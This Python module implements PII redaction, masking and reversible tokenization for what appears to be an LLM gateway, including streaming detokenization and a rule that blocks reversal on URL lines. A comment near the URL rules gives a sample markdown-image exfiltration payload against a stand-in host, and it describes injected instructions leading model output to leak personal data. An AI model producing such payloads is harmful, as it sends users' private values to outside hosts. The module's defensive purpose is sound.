"""Masking modes (brief 08): redact `[CODE]`, mask (last characters visible), tokenize
`<<PII_n>>` with the mapping in Redis for the run (`PII_TOKEN_TTL_S`), reversed on the way out.

C17 (08-tam-1a): reversal happens at the exit only (the stored text and the history stay
tokenized). `PlaceholderAligner` keeps a placeholder whole across stream chunks on the writing
side; `StreamDetokenizer` aligns and reverses a stream one request reads and writes;
`detokenize_json` reverses every string of an event's data.
"""

import json
import logging
import re
from collections.abc import Sequence
from typing import Any, Protocol

from redis.exceptions import ResponseError

from ffcore.core.errors import ApiError
from ffcore.guardrails.findings import Finding

KEEP_VISIBLE = 4
# A scope issues at most 8 digits (r3 MINOR-r3-2, KARARLAR ek (f)): a longer `<<PII_n>>` is no
# placeholder, never reversed in any scope.
PLACEHOLDER = re.compile(r"<<PII_\d{1,8}>>")
PLACEHOLDER_MAX_NUMBER = 99_999_999
# plan/08 C17: the longest placeholder is 16 characters (`<<PII_` + up to 8 digits + `>>`); a
# stream holds at most 15 while one may still be open. A longer run passes as it is.
PLACEHOLDER_MAX_CHARS = 16
_OPEN_PLACEHOLDER = re.compile(r"<(?:<(?:P(?:I(?:I(?:_(?:\d{1,8}>?)?)?)?)?)?)?")

log = logging.getLogger(__name__)


class RevealUnavailable(RuntimeError):
    """The token store could not be read at the exit (C17, r1 MINOR-11): the reader's stream ends
    with an error event instead of breaking without one or showing placeholders silently."""


class PlaceholderOutOfRange(ApiError):
    """A scope would issue a 9-digit placeholder (r3 MINOR-r3-2, KARARLAR ek (f)): fail loudly
    instead of a number a stream cannot align and an older text may already carry."""

    def __init__(self) -> None:
        super().__init__(
            400,
            "invalid_request_error",
            "placeholder_out_of_range",
            "A placeholder number in the text is out of range (at most 99999998 can be carried).",
        )


class TokenScopeMissing(ValueError):
    """tokenize needs a scope (the run id); without one the mapping could not be reversed."""


class TokenStore(Protocol):
    async def token_for(self, scope: str, key: str, value: str) -> str: ...

    async def lookup(self, scope: str, token: str) -> str | None: ...

    async def entry(self, scope: str, token: str) -> tuple[str, str] | None:
        """(value, identity) of a placeholder, without renewing the mapping's lifetime (r2
        MINOR-r2-4: reading a conversation's history does not keep earlier runs' values)."""
        ...

    async def reserve(self, scope: str, number: int) -> None:
        """The scope's next placeholder number is above `number` (08-tam-1a r1 MAJOR-2: a
        placeholder carried over from an earlier scope never becomes a new value's)."""
        ...


def _identity(category: str, value: str) -> str:
    # Exactly the same value gets the same placeholder. No normalisation: "a.b@x" and "ab@x" are
    # different addresses (review r1); a reformatted number gets a new placeholder, never a
    # wrong one.
    return category + ":" + value


class MemoryTokenStore:
    """In-process store for unit tests and the dry-run test panel."""

    def __init__(self) -> None:
        self._scopes: dict[str, dict[str, str]] = {}
        self._counters: dict[str, int] = {}

    async def token_for(self, scope: str, key: str, value: str) -> str:
        mapping = self._scopes.setdefault(scope, {})
        if "k:" + key not in mapping:
            if self._counters.get(scope, 0) >= PLACEHOLDER_MAX_NUMBER:
                raise PlaceholderOutOfRange()
            self._counters[scope] = self._counters.get(scope, 0) + 1
            token = f"<<PII_{self._counters[scope]}>>"
            mapping["k:" + key] = token
            mapping["t:" + token] = value
            mapping["i:" + token] = key
        return mapping["k:" + key]

    async def lookup(self, scope: str, token: str) -> str | None:
        return self._scopes.get(scope, {}).get("t:" + token)

    async def entry(self, scope: str, token: str) -> tuple[str, str] | None:
        mapping = self._scopes.get(scope, {})
        if "t:" + token not in mapping:
            return None
        return mapping["t:" + token], mapping["i:" + token]

    async def reserve(self, scope: str, number: int) -> None:
        self._counters[scope] = max(self._counters.get(scope, 0), number)


# Get-or-create in one Redis call: Lua runs atomically, so no caller ever sees the forward entry
# (`k:`) without the reverse one (`t:`) (review r1). The counter lives in its own key with a long
# lifetime (r1 MAJOR-1, KARARLAR "Yer tutucu sayacı"): when the mapping expires
# (PII_TOKEN_TTL_S), a new value in the same scope gets the next number, never an old one, so a
# stored placeholder is never read as another person's value. A mapping written before the
# counter key existed seeds it from its own `n` field.
_TOKEN_FOR = """
local token = redis.call('HGET', KEYS[1], 'k:' .. ARGV[1])
if not token then
  if redis.call('EXISTS', KEYS[2]) == 0 then
    local seed = redis.call('HGET', KEYS[1], 'n')
    if seed then redis.call('SET', KEYS[2], seed) end
  end
  if tonumber(redis.call('GET', KEYS[2]) or '0') >= tonumber(ARGV[5]) then
    return redis.error_reply('placeholder_out_of_range')
  end
  token = '<<PII_' .. redis.call('INCR', KEYS[2]) .. '>>'
  redis.call('HSET', KEYS[1], 'k:' .. ARGV[1], token, 't:' .. token, ARGV[2],
    'i:' .. token, ARGV[1])
end
redis.call('EXPIRE', KEYS[1], ARGV[3])
redis.call('EXPIRE', KEYS[2], ARGV[4])
return token
"""

_RESERVE = """
local current = tonumber(redis.call('GET', KEYS[1]) or '0')
if current < tonumber(ARGV[1]) then
  redis.call('SET', KEYS[1], ARGV[1])
end
redis.call('EXPIRE', KEYS[1], ARGV[2])
return 1
"""

# The counter outlives every stored copy of a placeholder: run events and messages are kept at
# most a year by retention (03c: jobs 90-365 days, content 1-90).
COUNTER_TTL_S = 400 * 24 * 3600


class RedisTokenStore:
    """One hash per scope: `k:<identity>` → token, `t:<token>` → value, `i:<token>` → identity;
    the counter in `<prefix>n:<scope>`.

    The mapping's TTL is renewed on every write and every lookup, so it lives as long as the run
    uses it (r1 MAJOR-1: a long wait for an approval that still reads its placeholders).
    """

    def __init__(self, redis, ttl_s: int, prefix: str = "ffcore:pii:") -> None:
        self._redis = redis
        self._ttl = ttl_s
        self._prefix = prefix

    def _keys(self, scope: str) -> tuple[str, str]:
        return self._prefix + scope, self._prefix + "n:" + scope

    async def token_for(self, scope: str, key: str, value: str) -> str:
        mapping, counter = self._keys(scope)
        try:
            token = await self._redis.eval(
                _TOKEN_FOR,
                2,
                mapping,
                counter,
                key,
                value,
                self._ttl,
                COUNTER_TTL_S,
                PLACEHOLDER_MAX_NUMBER,
            )
        except ResponseError as exc:
            if "placeholder_out_of_range" in str(exc):
                raise PlaceholderOutOfRange() from None
            raise
        return token.decode() if isinstance(token, bytes) else token

    async def lookup(self, scope: str, token: str) -> str | None:
        mapping, _ = self._keys(scope)
        value = await self._redis.hget(mapping, "t:" + token)
        if value is not None:
            await self._redis.expire(mapping, self._ttl)
        return value.decode() if isinstance(value, bytes) else value

    async def entry(self, scope: str, token: str) -> tuple[str, str] | None:
        mapping, _ = self._keys(scope)
        value, identity = await self._redis.hmget(mapping, "t:" + token, "i:" + token)
        if value is None:
            return None
        value = value.decode() if isinstance(value, bytes) else value
        if identity is None:
            # A mapping issued before the identity field: same value, a category of its own (it
            # only decides which values share a placeholder).
            return value, _identity("PII", value)
        return value, identity.decode() if isinstance(identity, bytes) else identity

    async def reserve(self, scope: str, number: int) -> None:
        _, counter = self._keys(scope)
        await self._redis.eval(_RESERVE, 1, counter, number, COUNTER_TTL_S)


def redact_label(category: str) -> str:
    return f"[{category}]"


def mask_value(category: str, value: str) -> str:
    """A masked value never equals the raw one (review r1): at most the last four characters,
    and never more than half of them, stay visible; a one-letter e-mail local part becomes "*"."""
    if category == "EMAIL_ADDRESS" and "@" in value:
        local, _, domain = value.partition("@")
        head = local[:1] if len(local) > 1 else ""
        return head + "*" * (len(local) - len(head)) + "@" + domain
    alnum = sum(1 for c in value if c.isalnum())
    visible = min(KEEP_VISIBLE, alnum // 2)
    hide, out = alnum - visible, []
    for char in value:
        if char.isalnum() and hide > 0:
            out.append("*")
            hide -= 1
        else:
            out.append(char)
    masked = "".join(out)
    if masked == value:
        # Nothing alphanumeric to hide ("...", "--"): mask every character instead.
        masked = "*" * len(value)
    return masked


async def apply_action(
    text: str,
    findings: Sequence[Finding],
    action: str,
    *,
    store: TokenStore | None = None,
    scope: str | None = None,
) -> str:
    """Rewrite `text` for a transforming action; other actions return it unchanged."""
    return await apply_findings(text, [(f, action) for f in findings], store=store, scope=scope)


async def apply_findings(
    text: str,
    actions: Sequence[tuple[Finding, str]],
    *,
    store: TokenStore | None = None,
    scope: str | None = None,
) -> str:
    """Rewrite each finding with its own action (a PII policy may mix redact, mask, tokenize).

    Findings must not overlap (recognizers resolve overlaps). Non-transforming actions keep text.
    """
    ordered = sorted(
        ((f, a) for f, a in actions if a in ("redact", "mask", "tokenize")),
        key=lambda x: x[0].start,
    )
    if any(a == "tokenize" for _, a in ordered) and (store is None or not scope):
        raise TokenScopeMissing("tokenize needs a token store and a scope (run id)")
    out, cursor = [], 0
    for finding, action in ordered:
        if action == "redact":
            replacement = redact_label(finding.category)
        elif action == "mask":
            replacement = mask_value(finding.category, finding.value)
        else:
            key = _identity(finding.category, finding.value)
            replacement = await store.token_for(scope, key, finding.value)
        out.append(text[cursor : finding.start])
        out.append(replacement)
        cursor = finding.end
    out.append(text[cursor:])
    return "".join(out)


async def detokenize(text: str, *, store: TokenStore, scope: str) -> tuple[str, list[str]]:
    """Put the original values back. Placeholders the run never issued stay as they are and are
    returned in `unresolved` (a model can invent one); nothing is guessed."""
    unresolved: list[str] = []
    out, cursor = [], 0
    for match in PLACEHOLDER.finditer(text):
        value = await store.lookup(scope, match.group(0))
        out.append(text[cursor : match.start()])
        if value is None:
            unresolved.append(match.group(0))
            out.append(match.group(0))
        else:
            out.append(value)
        cursor = match.end()
    out.append(text[cursor:])
    return "".join(out), unresolved


class PlaceholderAligner:
    """The writing side of a stream: `feed` returns the text that may be published now, holding
    back a tail that could be the start of a placeholder (at most 15 characters) until the next
    chunk shows how it ends; `flush` returns that tail at the end of the stream, as it is."""

    def __init__(self) -> None:
        self._held = ""

    def feed(self, text: str) -> str:
        buffer = self._held + text
        cut = len(buffer)
        for i in range(max(0, len(buffer) - (PLACEHOLDER_MAX_CHARS - 1)), len(buffer)):
            if buffer[i] == "<" and _OPEN_PLACEHOLDER.fullmatch(buffer, i):
                cut = i
                break
        self._held = buffer[cut:]
        return buffer[:cut]

    def flush(self) -> str:
        held, self._held = self._held, ""
        return held


# r1 MAJOR-3, r2 MAJOR-r2-1 and r3 MAJOR-r3-1 (KARARLAR "C17 geri çevirme bağlam istisnası", "C17
# URL bağlam kuralı satır düzeyinde ve fail-closed" and its addendum): an upstream (external
# agent, provider, injected instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a
# client that loads images would send the value to that host. The rule is per line and by class,
# not per URL spelling: no placeholder is reversed on a line with an HTML tag (`<` and a letter;
# a placeholder is not one), a URL scheme with its colon, or a markdown/CSS/attribute marker.
_HTML_TAG = r"<(?!PII_\d)[a-z]"
_ATTRS = r"(?:src|href|srcset|action|poster|background|style|data)"
_URL_MARKER = re.compile(
    r"\]\(|\]:|//|url\(|"
    + _HTML_TAG
    + r"|\b(?:https?|ftp|data|javascript|blob|file):|\b"
    + _ATTRS
    + r"\s*=",
    re.IGNORECASE,
)
# What opens a target that may go on past the end of its line (an HTML tag, a quoted attribute
# value, a markdown destination or CSS `url(`, `]:` or `=` with the value on the next line): the
# next line is under the rule too, until the target closes. An attribute name that ends a line
# carries "a value is due".
_URL_OPENER = re.compile(
    r"\]\(<|\]\(|url\(|\]:|" + _HTML_TAG + r"|\b" + _ATTRS + r"\s*=", re.IGNORECASE
)
_ATTR_NAME_END = re.compile(r"\b" + _ATTRS + r"\s*\Z", re.IGNORECASE)
_LINE_BREAK = re.compile(r"\r\n|\r|\n")
_PARENS = re.compile(r"[()]")
_TAG_STOP = re.compile(r"[>\"']")
_TARGET_OPEN = {'"': "dq", "'": "sq"}
# mode -> (what closes it, the mode after it)
_TARGET_CLOSE = {
    "dq": ('"', None),
    "sq": ("'", None),
    "angle": (">", None),
    "tag_dq": ('"', "tag"),
    "tag_sq": ("'", "tag"),
}
# How much of a stream's current line is kept to see a marker split over chunks; a line longer
# than this lost its start and its placeholders are kept (fail-closed).
URL_CONTEXT_MAX_CHARS = 8192
# How much of the text before a piece the scan looks at again, so a marker split over pieces is
# seen; longer than every marker (spaces between an attribute name and `=` are `_gap`).
_MARKER_OVERLAP = 32


def _open_target(line: str, mode: str | int | None) -> str | int | None:
    """The target still open at the end of `line`, given the one open at its start: None, a
    markdown destination's paren depth (positive) or CSS `url(`'s (negative), "md_expect" or
    "expect" (a markdown or an HTML value is due), "tag" (inside an HTML tag) or the quote/angle
    that closes it."""
    i = 0
    while i < len(line):
        if mode == "md_expect":
            while i < len(line) and line[i] in " \t":
                i += 1
            if i == len(line):
                return mode
            mode = "angle" if line[i] == "<" else None
            i += 1 if mode else 0
        elif mode == "expect":
            while i < len(line) and line[i] in " \t=":
                i += 1
            if i == len(line):
                return mode
            mode = _TARGET_OPEN.get(line[i])
            i += 1 if mode else 0
        elif mode is None:
            opener = _URL_OPENER.search(line, i)
            if opener is None:
                break
            i, token = opener.end(), opener.group(0).lower()
            if token == "](<":
                mode = "angle"
            elif token == "](":
                mode = 1
            elif token == "url(":
                mode = -1
            elif token.startswith("<"):
                mode = "tag"
            else:
                mode = "md_expect" if token == "]:" else "expect"
        elif mode == "tag":
            stop = _TAG_STOP.search(line, i)
            if stop is None:
                return mode
            i = stop.end()
            mode = {">": None, '"': "tag_dq", "'": "tag_sq"}[stop.group(0)]
        elif isinstance(mode, int):
            paren = _PARENS.search(line, i)
            if paren is None:
                return mode
            i = paren.end()
            step = 1 if mode > 0 else -1
            mode = mode + step if paren.group(0) == "(" else (mode - step or None)
        else:
            closer, after = _TARGET_CLOSE[mode]
            j = line.find(closer, i)
            if j < 0:
                return mode
            mode, i = after, j + 1
    if mode is None and _ATTR_NAME_END.search(line):
        return "expect"
    return mode


def _closes_on_blank(mode: str | int | None) -> bool:
    return mode in ("angle", "md_expect") or (isinstance(mode, int) and mode > 0)


class UrlLines:
    """Which parts of a text, or of a stream fed piece by piece, sit on a URL line: `spans` takes
    the next piece and returns its (start, end) ranges whose placeholders are kept.

    The scan is incremental (r3 MAJOR-r3-2, KARARLAR "C17 URL bağlam kuralı, ek" (c)): a piece is
    scanned with the last `_MARKER_OVERLAP` characters before it, and not at all once its line
    is marked or cut; the line's text is kept only while its open target may be needed."""

    def __init__(self) -> None:
        self._pieces: list[str] = []  # the current line, while it is at most the window
        self._length = 0
        self._tail = ""  # the current line's last _MARKER_OVERLAP characters
        self._gap = False  # the line ends with an attribute name and spaces: `=` may follow
        self._cut = False  # the current line is longer than URL_CONTEXT_MAX_CHARS
        self._marked = False  # a marker was seen on the current line
        self._open: str | int | None = None  # the target open at the start of the current line
        self._lost = False  # a URL line lost its start: what it left open is unknown
        self._blank = True  # the current line has only whitespace so far

    def spans(self, text: str) -> list[tuple[int, int]]:
        out, start = [], 0
        for brk in [*_LINE_BREAK.finditer(text), None]:
            end = brk.start() if brk else len(text)
            self._add(text[start:end])
            if self._lost or self._open is not None or self._marked or self._cut:
                out.append((start, end))
            if brk is None:
                return out
            self._end_line()
            start = brk.end()
        return out

    def mark(self) -> None:
        """The current line is under the rule whatever it carries (a reader whose earlier text
        is unknown, r3 MINOR-r3-1)."""
        self._marked = True

    def _add(self, piece: str) -> None:
        if not piece:
            return
        self._blank = self._blank and piece.isspace()
        if not self._cut:
            self._length += len(piece)
            if self._length > URL_CONTEXT_MAX_CHARS:
                self._cut, self._pieces = True, []
            else:
                self._pieces.append(piece)
        if self._marked:
            return
        if self._gap and piece.lstrip()[:1] == "=":
            self._marked = True  # `src` + any number of spaces + `=`
            return
        window = self._tail + piece
        if _URL_MARKER.search(window):
            self._marked = True
            return
        self._gap = (self._gap and piece.isspace()) or _ATTR_NAME_END.search(window) is not None
        self._tail = window[-_MARKER_OVERLAP:]

    def _end_line(self) -> None:
        if self._blank and _closes_on_blank(self._open):
            # r3 MINOR-r3-4, KARARLAR ek (e): a markdown target does not cross a blank line; an
            # HTML one may (a browser drops line breaks from a URL), and a lost state is unknown.
            self._open = None
        elif self._marked or self._open is not None:
            if self._cut:
                self._lost = True
            elif not self._lost:
                self._open = _open_target("".join(self._pieces), self._open)
        self._pieces, self._length, self._tail = [], 0, ""
        self._gap = self._cut = self._marked = False
        self._blank = True


async def reveal_text(
    text: str,
    *,
    store: TokenStore,
    scope: str,
    lines: UrlLines | None = None,
    json_escape: bool = False,
) -> tuple[str, int, int]:
    """(text with this scope's placeholders turned back into values, unresolved count, kept on a
    URL line count). `lines` carries a stream's state from its earlier pieces; without it the
    text stands alone. `json_escape` writes each value as it must appear inside a JSON string
    (tool call arguments, r1 MINOR-3)."""
    spans = (lines or UrlLines()).spans(text)
    if "<<PII_" not in text:
        return text, 0, 0
    out, cursor, unresolved, skipped = [], 0, 0, 0
    for match in PLACEHOLDER.finditer(text):
        start, end = match.span()
        out.append(text[cursor:start])
        cursor = end
        if any(a <= start and end <= b for a, b in spans):
            skipped += 1
            out.append(match.group(0))
            continue
        value = await store.lookup(scope, match.group(0))
        if value is None:
            unresolved += 1
            out.append(match.group(0))
        else:
            out.append(json.dumps(value, ensure_ascii=False)[1:-1] if json_escape else value)
    out.append(text[cursor:])
    return "".join(out), unresolved, skipped


class StreamDetokenizer:
    """Aligner + reversal for a stream one request writes and reads (the facade's direct model
    path): no chunk it returns contains a placeholder the scope issued, split or whole, except
    on a URL line (kept, `skipped_url`). `unresolved` counts placeholders the scope never issued
    (left as they are)."""

    def __init__(self, store: TokenStore, scope: str, *, json_escape: bool = False) -> None:
        self._store, self._scope, self._json = store, scope, json_escape
        self._aligner = PlaceholderAligner()
        self._lines = UrlLines()
        self._pending = ""
        self.unresolved = 0
        self.skipped_url = 0

    async def _reverse(self, text: str) -> str:
        self._pending = text  # until it is reversed: `abandon` gives it back as it is
        out, unresolved, skipped = await reveal_text(
            text, store=self._store, scope=self._scope, lines=self._lines, json_escape=self._json
        )
        self._pending = ""
        self.unresolved += unresolved
        self.skipped_url += skipped
        return out

    async def feed(self, text: str) -> str:
        return await self._reverse(self._aligner.feed(text))

    async def flush(self) -> str:
        return await self._reverse(self._aligner.flush())

    def abandon(self) -> str:
        """What it holds, unreversed (the token store failed): the piece it was reversing and
        the aligned tail."""
        pending, self._pending = self._pending, ""
        return pending + self._aligner.flush()


class ContextReveal:
    """Reversal of a run's event data (C17), one reader: strings within the scope; the `token`
    events of a live stream share their URL line state, so a URL split over two entries is
    seen."""

    def __init__(self, store: TokenStore, scope: str) -> None:
        self._store, self._scope = store, scope
        self._lines = UrlLines()
        self.unresolved = 0
        self.skipped_url = 0

    def prime(self, text: str) -> None:
        """Text the reader got before this reader started (rebuilds the line state, no reveal)."""
        self._lines.spans(text)

    def fail_closed(self) -> None:
        """The earlier text is unknown: the first line keeps its placeholders."""
        self._lines.mark()

    async def data(self, data: Any, *, stream_text: bool = False) -> Any:
        if stream_text and isinstance(data, dict) and isinstance(data.get("text"), str):
            text, unresolved, skipped = await reveal_text(
                data["text"], store=self._store, scope=self._scope, lines=self._lines
            )
            self.unresolved += unresolved
            self.skipped_url += skipped
            return {**data, "text": text}
        out, unresolved, skipped = await detokenize_json(data, store=self._store, scope=self._scope)
        self.unresolved += unresolved
        self.skipped_url += skipped
        return out


async def detokenize_json(data: Any, *, store: TokenStore, scope: str) -> tuple[Any, int, int]:
    """(a copy of `data` with every string reversed within `scope`, unresolved count, kept in a
    URL line count): each string stands alone; placeholders stay where the scope never issued
    them, the mapping expired or they sit on a URL line."""
    if isinstance(data, str):
        return await reveal_text(data, store=store, scope=scope)
    if isinstance(data, list):
        items = [await detokenize_json(v, store=store, scope=scope) for v in data]
        return [v for v, _, _ in items], sum(i[1] for i in items), sum(i[2] for i in items)
    if isinstance(data, dict):
        pairs = {k: await detokenize_json(v, store=store, scope=scope) for k, v in data.items()}
        return (
            {k: v for k, (v, _, _) in pairs.items()},
            sum(i[1] for i in pairs.values()),
            sum(i[2] for i in pairs.values()),
        )
    return data, 0, 0


def log_skipped_url(scope: str, count: int) -> None:
    """r1 MAJOR-3: placeholders kept because they sit in a URL; scope and count, never a
    value."""
    if count:
        log.info("detokenize_skipped_url scope=%s count=%d", scope, count)


def log_unresolved(scope: str, count: int) -> None:
    """S9 (K-08T1-0002): a placeholder that cannot be reversed stays; it is logged with the
    scope and the count, never the value."""
    if count:
        log.warning("detokenize_unresolved scope=%s count=%d", scope, count)


def placeholder_numbers(text: str) -> list[int]:
    """The numbers of the placeholders in `text` (`<<PII_7>>` → 7); a 9+ digit `<<PII_n>>` is
    not one (r2 MINOR-r2-1)."""
    return [int(m.group(0)[6:-2]) for m in PLACEHOLDER.finditer(text)]


async def reserve_carried(store: TokenStore, scope: str, data: Any) -> None:
    """Before a scope's first tokenize: its counter goes past every placeholder number in the text
    that enters it (client history, the question, the conversation's history), so a placeholder
    carried in from elsewhere never becomes one of the scope's values (r2 MAJOR-r2-2, KARARLAR
    "Konuşma geçmişinde yer tutucu eşlemesi doğrudan ve hamsız")."""
    text = data if isinstance(data, str) else json.dumps(data, ensure_ascii=False)
    numbers = placeholder_numbers(text) if "<<PII_" in text else []
    if numbers:
        if max(numbers) >= PLACEHOLDER_MAX_NUMBER:
            # the next number would have 9 digits (r3 MINOR-r3-2, KARARLAR ek (f))
            raise PlaceholderOutOfRange()
        await store.reserve(scope, max(numbers))


async def rescope(text: str, *, store: TokenStore, source: str, target: str) -> str:
    """`text` with `source`'s placeholders turned into `target`'s for the same values, never
    through the raw text (r2 MAJOR-r2-3): the value is read in `source` (without renewing it) and
    issued in `target` by its identity. A placeholder `source` cannot resolve stays as it is;
    `reserve_carried` has kept `target` from issuing its number."""
    if source == target or "<<PII_" not in text:
        return text
    out, cursor = [], 0
    for match in PLACEHOLDER.finditer(text):
        out.append(text[cursor : match.start()])
        cursor = match.end()
        found = await store.entry(source, match.group(0))
        if found is None:
            out.append(match.group(0))
        else:
            value, identity = found
            out.append(await store.token_for(target, identity, value))
    out.append(text[cursor:])
    return "".join(out)


def count_placeholders(data: Any) -> int:
    """How many placeholders the strings of `data` carry (no lookup, no value)."""
    if isinstance(data, str):
        return len(PLACEHOLDER.findall(data)) if "<<PII_" in data else 0
    if isinstance(data, list):
        return sum(count_placeholders(v) for v in data)
    if isinstance(data, dict):
        return sum(count_placeholders(v) for v in data.values())
    return 0


def log_skipped_policy(scope: str, count: int) -> None:
    """K-08T1-0004: placeholders kept at the exit because the policy enforces a `pii` rule on
    the output; logged with the scope and the count, never a value."""
    if count:
        log.info("detokenize_skipped_policy scope=%s count=%d", scope, count)
